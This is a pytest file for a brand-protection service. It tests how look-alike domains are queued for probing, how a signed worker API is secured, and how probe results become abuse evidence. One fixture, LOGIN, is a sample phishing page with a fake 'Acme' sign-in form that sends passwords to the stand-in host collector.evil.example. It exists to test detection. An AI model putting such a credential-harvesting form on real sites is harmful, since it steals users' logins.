import json
import time
import uuid
from datetime import datetime, timedelta, timezone

import pytest
from sqlalchemy import select

from app.config import settings
from app.models import BrandCandidate, BrandProbeJob
from app.services import brand_probe_protocol as pp
from app.services import brand_probe_queue as q
from tests.test_brand_graph import _brand, cand

KEY = "probe-key-" + "x" * 30
NOW = datetime.now(timezone.utc)


@pytest.fixture
def on(monkeypatch):
    monkeypatch.setattr(settings, "brand_probe_enabled", True)
    monkeypatch.setattr(settings, "brand_probe_key", KEY)


@pytest.fixture(autouse=True)
def _rescore_uses_test_session(db_session, monkeypatch):
    import app.services.brand_guard_service as svc
    monkeypatch.setattr(svc, "scan_profile", svc.scan_profile)        # (no network is needed: rescoring reads stored facts)


async def _setup(db, *specs):
    tenant, profile = await _brand(db, name=f"acme-{uuid.uuid4().hex[:8]}.co.za")
    profile.official_domains = ["acme.com"]
    rows = []
    for domain, status, stage, identity in specs:
        c = cand(profile, domain, status=status)
        c.stage, c.identity_score = stage, identity
        db.add(c)
        rows.append(c)
    await db.commit()
    return tenant, profile, rows


def test_eligibility_rules():
    assert q.eligible("suspicious", "resolving", 80) and q.eligible("confirmed", "certified", 0) and q.eligible("takedown", "resolving", 10)
    assert not q.eligible("suspicious", "registered", 99)           # not live
    assert not q.eligible("false_positive", "resolving", 99) and not q.eligible("customer_owned", "resolving", 99)
    assert not q.eligible("monitoring", "resolving", 10)             # watched, but not resembling the brand enough
    assert q.eligible("monitoring", "resolving", 60)


async def test_nothing_is_queued_or_handed_out_while_the_kill_switch_is_off(db_session):
    _, profile, _ = await _setup(db_session, ("a.xyz", "confirmed", "resolving", 90))
    assert not q.enabled() and await q.enqueue_due(db_session, profile) == 0 and await q.claim(db_session) is None
    assert (await db_session.execute(select(BrandProbeJob))).scalars().all() == []


async def test_the_switch_needs_both_the_flag_and_a_key(db_session, monkeypatch):
    monkeypatch.setattr(settings, "brand_probe_enabled", True)
    monkeypatch.setattr(settings, "brand_probe_key", "")
    assert not q.enabled()
    monkeypatch.setattr(settings, "brand_probe_enabled", False)
    monkeypatch.setattr(settings, "brand_probe_key", KEY)
    assert not q.enabled()


async def test_only_eligible_look_alikes_are_queued_once_and_not_again_within_the_interval(db_session, on):
    _, profile, rows = await _setup(db_session, ("live.xyz", "confirmed", "resolving", 90), ("dormant.xyz", "confirmed", "registered", 90), ("dismissed.xyz", "false_positive", "resolving", 90), ("weak.xyz", "monitoring", "resolving", 5))
    assert await q.enqueue_due(db_session, profile) == 1
    await db_session.commit()
    jobs = (await db_session.execute(select(BrandProbeJob))).scalars().all()
    assert [j.host for j in jobs] == ["live.xyz"] and jobs[0].status == "queued" and jobs[0].kind == "light"
    assert await q.enqueue_due(db_session, profile) == 0              # already waiting
    jobs[0].status, jobs[0].completed_at = "done", NOW
    await db_session.commit()
    assert await q.enqueue_due(db_session, profile) == 0              # probed within the last day
    jobs[0].created_at = NOW - timedelta(hours=settings.brand_probe_host_interval_hours + 1)
    await db_session.commit()
    assert await q.enqueue_due(db_session, profile) == 1              # due again


async def test_the_tenant_daily_cap_limits_how_many_are_queued_most_abusive_first(db_session, on, monkeypatch):
    monkeypatch.setattr(settings, "brand_probe_tenant_daily_cap", 2)
    _, profile, rows = await _setup(db_session, *[(f"h{i}.xyz", "confirmed", "resolving", 90) for i in range(4)])
    for i, r in enumerate(rows):
        r.abuse_score = i * 10
    await db_session.commit()
    assert await q.enqueue_due(db_session, profile) == 2
    await db_session.commit()
    assert {j.host for j in (await db_session.execute(select(BrandProbeJob))).scalars().all()} == {"h3.xyz", "h2.xyz"}
    assert await q.enqueue_due(db_session, profile) == 0


async def test_claim_hands_out_the_oldest_waiting_job_once_and_marks_expired_ones(db_session, on):
    _, profile, rows = await _setup(db_session, ("a.xyz", "confirmed", "resolving", 90), ("b.xyz", "confirmed", "resolving", 90))
    old = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=rows[0].id, host="a.xyz", status="queued", expires_at=NOW - timedelta(minutes=1), created_at=NOW - timedelta(hours=2))
    fresh = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=rows[1].id, host="b.xyz", status="queued", expires_at=NOW + timedelta(days=1), created_at=NOW - timedelta(hours=1))
    db_session.add_all([old, fresh])
    await db_session.commit()
    got = await q.claim(db_session)
    assert got.host == "b.xyz" and got.status == "claimed" and got.claimed_at
    assert (await db_session.get(BrandProbeJob, old.id)).status == "expired"
    assert await q.claim(db_session) is None                          # nothing else waiting


async def _claimed(db, profile, row, host="live.xyz"):
    j = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=row.id, host=host, status="claimed", claimed_at=NOW, expires_at=NOW + timedelta(days=1))
    db.add(j)
    await db.commit()
    return j


LOGIN = "<title>Acme - sign in</title><form action='https://collector.evil.example/x'><input type=password></form>"


async def test_a_result_is_cleaned_analysed_stored_as_facts_and_raises_the_score_without_keeping_the_html(db_session, on):
    _, profile, rows = await _setup(db_session, ("live.xyz", "monitoring", "resolving", 80))
    row = rows[0]
    job = await _claimed(db_session, profile, row)
    raw = {"ok": True, "chain": [{"url": "http://live.xyz/", "status": 200}], "final_status": 200, "content_type": "text/html", "html": LOGIN + "<script>SECRET_MARKER</script>", "extra": "dropped"}
    assert await q.complete(db_session, job.id, raw) == "ok"
    await db_session.refresh(job)
    await db_session.refresh(row)
    assert job.status == "done" and job.result["password_form"] and "SECRET_MARKER" not in json.dumps(job.result) and "SECRET_MARKER" not in json.dumps(row.enrichment)
    assert row.enrichment["probe"]["offsite_password_form"] and row.enrichment["probe"]["at"]
    from sqlalchemy import select as sel
    from app.models import CandidateEvidence
    ev = {e.signal: e for e in (await db_session.execute(sel(CandidateEvidence).where(CandidateEvidence.candidate_id == row.id))).scalars().all()}
    assert "page_password_form" in ev and ev["page_password_form"].weight == 28 and ev["page_password_form"].dimension == "abuse"


async def test_a_failed_probe_is_recorded_and_adds_no_evidence(db_session, on):
    _, profile, rows = await _setup(db_session, ("live.xyz", "monitoring", "resolving", 80))
    job = await _claimed(db_session, profile, rows[0])
    assert await q.complete(db_session, job.id, {"ok": False, "error": "could not connect"}) == "ok"
    await db_session.refresh(job)
    assert job.status == "failed" and job.error == "could not connect"
    await db_session.refresh(rows[0])
    assert rows[0].enrichment["probe"]["reachable"] is False


async def test_results_are_refused_for_unknown_unclaimed_expired_and_already_finished_jobs_and_when_off(db_session, on, monkeypatch):
    _, profile, rows = await _setup(db_session, ("live.xyz", "monitoring", "resolving", 80))
    assert await q.complete(db_session, uuid.uuid4(), {"ok": True}) == "unknown"
    waiting = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=rows[0].id, host="live.xyz", status="queued", expires_at=NOW + timedelta(days=1))
    db_session.add(waiting)
    await db_session.commit()
    assert await q.complete(db_session, waiting.id, {"ok": True}) == "stale"                 # never claimed
    job = await _claimed(db_session, profile, rows[0])
    job.expires_at = NOW - timedelta(seconds=1)
    await db_session.commit()
    assert await q.complete(db_session, job.id, {"ok": True}) == "stale"                     # too late
    job.expires_at = NOW + timedelta(days=1)
    await db_session.commit()
    assert await q.complete(db_session, job.id, {"ok": True, "chain": [], "final_status": 200}) == "ok"
    assert await q.complete(db_session, job.id, {"ok": True}) == "stale"                     # a result applies once
    monkeypatch.setattr(settings, "brand_probe_enabled", False)
    other = await _claimed(db_session, profile, rows[0])
    assert await q.complete(db_session, other.id, {"ok": True}) == "disabled"


# ── the worker's HTTP API ─────────────────────────────────────────────────────

def _headers(method, path, body, key=KEY, ts=None):
    ts = ts or str(time.time())
    return {"X-Probe-Timestamp": ts, "X-Probe-Signature": pp.sign(key, method, path, ts, body), "Content-Type": "application/json"}


async def test_api_refuses_everything_while_off(client):
    body = b"{}"
    assert (await client.post("/probe-worker/claim", content=body, headers=_headers("POST", "/probe-worker/claim", body))).status_code == 503


async def test_api_rejects_bad_stale_and_wrongly_scoped_signatures(client, on):
    body = b"{}"
    ok = _headers("POST", "/probe-worker/claim", body)
    assert (await client.post("/probe-worker/claim", content=body, headers=ok)).status_code == 200
    assert (await client.post("/probe-worker/claim", content=body, headers={k: v for k, v in ok.items() if k != "X-Probe-Signature"})).status_code == 401
    assert (await client.post("/probe-worker/claim", content=body, headers=_headers("POST", "/probe-worker/claim", body, key="y" * 40))).status_code == 401
    assert (await client.post("/probe-worker/claim", content=body, headers=_headers("POST", "/probe-worker/claim", body, ts=str(time.time() - 600)))).status_code == 401
    assert (await client.post("/probe-worker/claim", content=body, headers=_headers("POST", "/probe-worker/jobs/x/result", body))).status_code == 401      # signed for a different path
    assert (await client.post("/probe-worker/claim", content=b'{"x":1}', headers=ok)).status_code == 401                                              # body changed after signing


async def test_api_end_to_end_claim_then_result_then_replay_is_refused(client, db_session, on):
    _, profile, rows = await _setup(db_session, ("live.xyz", "confirmed", "resolving", 90))
    assert await q.enqueue_due(db_session, profile) == 1
    await db_session.commit()
    body = b"{}"
    job = (await client.post("/probe-worker/claim", content=body, headers=_headers("POST", "/probe-worker/claim", body))).json()["job"]
    assert job["host"] == "live.xyz" and job["kind"] == "light" and set(job) == {"id", "host", "kind", "expires_at"}      # the worker learns nothing else
    path = f"/probe-worker/jobs/{job['id']}/result"
    payload = json.dumps({"result": {"ok": True, "chain": [{"url": "http://live.xyz/", "status": 200}], "final_status": 200, "content_type": "text/html", "html": LOGIN}}).encode()
    assert (await client.post(path, content=payload, headers=_headers("POST", path, payload))).status_code == 204
    assert (await client.post(path, content=payload, headers=_headers("POST", path, payload))).status_code == 409           # replay
    gone = f"/probe-worker/jobs/{uuid.uuid4()}/result"
    assert (await client.post(gone, content=payload, headers=_headers("POST", gone, payload))).status_code == 404
    bad = "/probe-worker/jobs/not-a-uuid/result"
    assert (await client.post(bad, content=payload, headers=_headers("POST", bad, payload))).status_code == 422
    assert (await client.post("/probe-worker/claim", content=body, headers=_headers("POST", "/probe-worker/claim", body))).json() == {"job": None}


async def test_api_refuses_an_oversize_body_before_reading_it_all(client, on):
    path = "/probe-worker/claim"
    body = b"x" * (pp.MAX_BODY_BYTES + 10)
    assert (await client.post(path, content=body, headers=_headers("POST", path, body))).status_code == 413


async def test_users_see_the_switch_state_and_waiting_jobs_but_cannot_change_it(auth_client, db_session, on):
    client, tenant = auth_client
    s = (await client.get("/brand-guard/probe-status")).json()
    assert s == {"enabled": True, "render_enabled": False, "worker_last_seen": None, "waiting": 0}      # the renderer has its own switch, off by default


async def test_a_waiting_job_is_not_handed_out_while_the_switch_is_off(db_session, monkeypatch):
    _, profile, rows = await _setup(db_session, ("live.xyz", "confirmed", "resolving", 90))
    job = BrandProbeJob(id=uuid.uuid4(), tenant_id=profile.tenant_id, candidate_id=rows[0].id, host="live.xyz", status="queued", expires_at=NOW + timedelta(days=1))
    db_session.add(job)
    await db_session.commit()
    assert not q.enabled() and await q.claim(db_session) is None
    await db_session.refresh(job)
    assert job.status == "queued"


async def test_a_result_with_wrong_types_is_cleaned_before_it_is_believed(db_session, on):
    _, profile, rows = await _setup(db_session, ("live.xyz", "monitoring", "resolving", 80))
    job = await _claimed(db_session, profile, rows[0])
    await q.complete(db_session, job.id, {"ok": True, "chain": [], "final_status": "200", "html": 12345})
    await db_session.refresh(rows[0])
    assert rows[0].enrichment["probe"]["reachable"] is False and rows[0].enrichment["probe"]["final_status"] is None        # "200" is not a status code
